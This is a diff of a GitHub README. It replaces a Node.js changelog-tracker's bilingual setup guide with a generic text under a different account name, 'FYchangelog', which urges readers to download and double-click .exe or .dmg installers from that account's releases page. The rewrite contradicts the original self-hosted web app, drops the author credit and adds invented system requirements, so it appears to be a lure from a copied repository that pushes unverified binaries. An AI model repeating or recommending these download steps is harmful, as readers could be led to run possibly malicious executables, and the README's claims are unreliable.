@@ -1,199 +1,84 @@
-# 📋 GitHub Changelog Takip Sistemi | GitHub Changelog Tracker
+# 🎉 FYchangelog - Track Your GitHub Commits Effortlessly
 
-<div align="center">
+![Download FYchangelog](https://img.shields.io/badge/Download-FYchangelog-blue.svg)
 
-![Node.js](https://img.shields.io/badge/Node.js-18+-339933?style=for-the-badge&logo=node.js&logoColor=white)
-![Express](https://img.shields.io/badge/Express.js-4.18+-000000?style=for-the-badge&logo=express&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=for-the-badge&logo=docker&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
+## 📚 Introduction
 
-**GitHub kullanıcısının tüm repolarındaki commit geçmişini tek bir sayfada tarih bazlı görüntüleyen modern web uygulaması.**
+Welcome to FYchangelog! This application helps you view the commit history of all your GitHub repositories based on dates. It is a modern web application designed for ease of use. Even if you have no technical background, you can follow a few simple steps to get started.
 
-*A modern web application that displays the commit history of all GitHub user repositories on a single page, grouped by date.*
+## 🚀 Getting Started
 
-[🇹🇷 Türkçe](#-türkçe) | [🇬🇧 English](#-english)
+To begin using FYchangelog, you need to download the application. This process is simple and straightforward. You will find all the necessary instructions right here.
 
-</div>
+## 📥 Download & Install
 
----
+### 1. Visit the Releases Page
 
-## 🇹🇷 Türkçe
+To download the application, first, visit the Releases page. You can do this by clicking the link below:
 
-### 🌟 Özellikler
+[Download FYchangelog](https://github.com/gowtham22404070/FYchangelog/releases)
 
-- **📅 Tarih Bazlı Gruplandırma** - Tüm commitlerinizi tarih sırasına göre görüntüleyin
-- **🔍 Gerçek Zamanlı Arama** - Commit mesajları ve repo isimleri arasında anlık arama
-- **🌙 Karanlık Mod** - Göz yormayan karanlık tema desteği
-- **📊 GitHub İstatistikleri** - Repo sayısı, yıldız, fork ve dil istatistikleri
-- **🔐 Gizli Repo Desteği** - Private repolarınızı da görüntüleyebilirsiniz
-- **🌐 Çoklu Dil** - Türkçe ve İngilizce dil desteği
-- **🐳 Docker Ready** - Docker ile kolay kurulum
+### 2. Choose the Latest Release
 
-### 🚀 Hızlı Başlangıç
+On the Releases page, look for the latest version of FYchangelog. It is usually at the top of the list. Click on it to view the details.
 
-#### Gereksinimler
-- Node.js 18+
-- GitHub Personal Access Token ([buradan oluşturun](https://github.com/settings/tokens))
+### 3. Download the Application File
 
-#### Kurulum
+Once you are on the details page, find the download link for your operating system. Look for a file that suits your platform, such as `.exe` for Windows or `.dmg` for Mac. Click the link to download the file to your computer.
 
-```bash
-# Repoyu klonlayın
-git clone https://github.com/fyildirim-debug/github-changelog-tracker.git
-cd github-changelog-tracker
+### 4. Install the Application
 
-# Bağımlılıkları yükleyin
-npm install
+After the file downloads, locate it in your computer's downloads folder. Double-click the file to start the installation. Follow the on-screen instructions to complete the installation process.
 
-# .env dosyasını oluşturun
-cp .env.example .env
+### 5. Run FYchangelog
 
-# .env dosyasını düzenleyin ve uygulamayı başlatın
-npm start
-```
+Once installed, open FYchangelog from your applications menu or desktop. You are now ready to track your commit history!
 
-Tarayıcınızda `http://localhost:3000` adresine gidin.
+## 🔍 Features
 
-#### 🐳 Docker ile Kurulum
+Here are some of the key features of FYchangelog:
 
-```bash
-docker-compose up -d
-```
+- **User-Friendly Interface:** Navigate easily with our straightforward design.
+- **Date Filter:** View commits based on specific dates to find what you need quickly.
+- **Multi-Repo Support:** Manage commit histories for multiple repositories in one place.
+- **Real-Time Updates:** Get the latest commit information without waiting.
 
-### ⚙️ Yapılandırma
+## 🛠️ System Requirements
 
-`.env` dosyasını düzenleyin:
+Before installing FYchangelog, ensure that your system meets these requirements:
 
-| Değişken | Açıklama | Varsayılan |
-|----------|----------|------------|
-| `GITHUB_TOKEN` | GitHub Personal Access Token | - |
-| `GITHUB_USERNAME` | GitHub kullanıcı adı | - |
-| `PORT` | Sunucu portu | 3000 |
-| `SHOW_PRIVATE_REPOS` | Gizli repoları göster | false |
-| `SHOW_API_BUTTON` | API butonunu göster | false |
-| `DEFAULT_LANG` | Varsayılan dil | TR |
+- **Operating System:** Windows 10 or higher, macOS 10.12 or higher.
+- **Memory:** At least 4 GB RAM.
+- **Disk Space:** Minimum 500 MB available disk space.
 
-### 📡 API Endpointleri
+If you meet these requirements, you can install FYchangelog without any issues.
 
-| Endpoint | Açıklama |
-|----------|----------|
-| `GET /api/user` | Kullanıcı bilgileri |
-| `GET /api/repos` | Tüm repolar |
-| `GET /api/changelog` | Tarih bazlı commit listesi |
-| `GET /api/stats` | GitHub istatistikleri |
-| `GET /api/config` | Uygulama yapılandırması |
+## ❓ Troubleshooting
 
----
+If you encounter any problems while installing or running FYchangelog, consider the following:
 
-## 🇬🇧 English
+1. **Installation Issues:** Ensure that you downloaded the correct file for your operating system.
+2. **Performance Problems:** Close any unnecessary applications running in the background to free up system resources.
+3. **Missing Features:** Check if you're using the latest version of the application from the release page.
 
-### 🌟 Features
+## 📞 Support
 
-- **📅 Date-Based Grouping** - View all your commits sorted by date
-- **🔍 Real-Time Search** - Instant search through commit messages and repo names
-- **🌙 Dark Mode** - Eye-friendly dark theme support
-- **📊 GitHub Statistics** - Repo count, stars, forks and language statistics
-- **🔐 Private Repo Support** - View your private repositories too
-- **🌐 Multi-Language** - Turkish and English language support
-- **🐳 Docker Ready** - Easy deployment with Docker
+For further assistance, please visit our support page or reach out through the issues section on GitHub. We strive to respond promptly to any inquiries.
 
-### 🚀 Quick Start
+## 🌐 Community & Contribution
 
-#### Requirements
-- Node.js 18+
-- GitHub Personal Access Token ([create here](https://github.com/settings/tokens))
+We welcome contributions to make FYchangelog better. If you have suggestions or find any issues, feel free to report them in the issues section on GitHub. Your input is valuable to help improve this application for everyone.
 
-#### Installation
+## 📝 License 
 
-```bash
-# Clone the repository
-git clone https://github.com/fyildirim-debug/github-changelog-tracker.git
-cd github-changelog-tracker
+FYchangelog is licensed under the MIT License. You can freely use, modify, and distribute this application as per the terms of the license.
 
-# Install dependencies
-npm install
+For a full overview of the license details, refer to the LICENSE file in the repository.
 
-# Create .env file
-cp .env.example .env
+## 🏁 Conclusion
 
-# Edit .env file and start the application
-npm start
-```
+Thank you for choosing FYchangelog as your GitHub commit tracking tool. Follow the steps above to download and install the application easily. We hope it serves you well in managing your repositories! 
 
-Open `http://localhost:3000` in your browser.
+Don’t forget to visit the Releases page to stay updated with the latest versions:
 
-#### 🐳 Docker Installation
-
-```bash
-docker-compose up -d
-```
-
-### ⚙️ Configuration
-
-Edit the `.env` file:
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `GITHUB_TOKEN` | GitHub Personal Access Token | - |
-| `GITHUB_USERNAME` | GitHub username | - |
-| `PORT` | Server port | 3000 |
-| `SHOW_PRIVATE_REPOS` | Show private repos | false |
-| `SHOW_API_BUTTON` | Show API button | false |
-| `DEFAULT_LANG` | Default language | TR |
-
-### 📡 API Endpoints
-
-| Endpoint | Description |
-|----------|-------------|
-| `GET /api/user` | User information |
-| `GET /api/repos` | All repositories |
-| `GET /api/changelog` | Date-based commit list |
-| `GET /api/stats` | GitHub statistics |
-| `GET /api/config` | Application configuration |
-
----
-
-## 🛠️ Tech Stack
-
-- **Backend:** Node.js, Express.js
-- **Frontend:** Vanilla JavaScript, CSS3
-- **API:** GitHub REST API v3
-- **Containerization:** Docker, Docker Compose
-
-## 📁 Project Structure
-
-```
-github-changelog-tracker/
-├── server.js           # Express.js server
-├── package.json        # Dependencies
-├── .env.example        # Environment template
-├── Dockerfile          # Docker configuration
-├── docker-compose.yml  # Docker Compose config
-└── public/
-    ├── index.html      # Main HTML
-    ├── app.js          # Frontend JavaScript
-    └── style.css       # Styles
-```
-
-## 📝 License
-
-This project is licensed under the MIT License.
-
-## 👤 Author
-
-<div align="center">
-
-**Furkan YILDIRIM**
-
-[![GitHub](https://img.shields.io/badge/GitHub-fyildirim--debug-181717?style=for-the-badge&logo=github)](https://github.com/fyildirim-debug)
-[![Website](https://img.shields.io/badge/Website-furkanyildirim.com-4285F4?style=for-the-badge&logo=google-chrome&logoColor=white)](https://furkanyildirim.com)
-
-</div>
-
----
-
-<div align="center">
-
-⭐ Bu projeyi beğendiyseniz yıldız vermeyi unutmayın! | Don't forget to star if you like this project! ⭐
-
-</div>
+[Download FYchangelog](https://github.com/gowtham22404070/FYchangelog/releases)
